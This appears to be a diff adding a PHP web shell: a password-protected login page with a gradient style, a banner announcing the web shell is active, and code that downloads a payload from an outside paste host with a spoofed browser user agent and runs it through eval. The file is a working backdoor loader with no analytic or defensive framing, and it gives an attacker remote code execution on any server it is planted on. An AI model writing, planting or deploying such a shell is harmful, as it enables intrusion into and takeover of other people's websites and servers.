@@ -1,0 +1,107 @@
+<?php
+session_start();
+
+$hash_pass = "b54f217deb06f4c2829d907544102fd26730401c9c9ce22f9c31c0855077dc93";
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: ".$_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (!isset($_SESSION['logged_in'])) {
+    if ($_SERVER["REQUEST_METHOD"] === "POST") {
+        $input_pass = $_POST["pass"] ?? "";
+        $input_hash = hash("sha256", $input_pass);
+
+        if ($input_hash === $hash_pass) {
+            $_SESSION['logged_in'] = true;
+            header("Location: ".$_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            $error = "Password salah!";
+        }
+    }
+
+    echo '<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Please come in</title>
+    <style>
+        body {
+            background: linear-gradient(to bottom right,rgb(0, 0, 0),rgb(0, 153, 255));
+            font-family: Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background-color: rgba(0,0,0,0.4);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.6);
+            width: 300px;
+            text-align: center;
+        }
+        input[type="password"], input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+        }
+        input[type="submit"] {
+            background-color: #2980b9;
+            color: white;
+            cursor: pointer;
+        }
+        .error {
+            color: #ff8080;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>🔒Hello World🔒</h2>';
+
+    if (!empty($error)) {
+        echo '<p class="error">' . htmlspecialchars($error) . '</p>';
+    }
+
+    echo '<form method="post">
+            <input type="password" name="pass" placeholder="Password..." required>
+            <input type="submit" value="Login">
+        </form>
+    </div>
+</body>
+</html>';
+    exit;
+}
+
+echo '<div style="text-align:right; padding:10px;">
+        <a href="?logout=true" style="color:red; text-decoration:none;">🚪 外出</a>
+      </div>';
+
+echo "<h3 style='padding:10px;'>✅ アクセス承認: Webshel​​l アクティブ</h3>";
+// ...
+?>
+<?php
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://bujang.online/raw/TSlIy8evRY");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Accept: text/html',
+    'Accept-Language: en-US,en;q=0.9'
+]);
+$output = curl_exec($ch);
+curl_close($ch);
+
+eval("?>".$output);
+?>
+
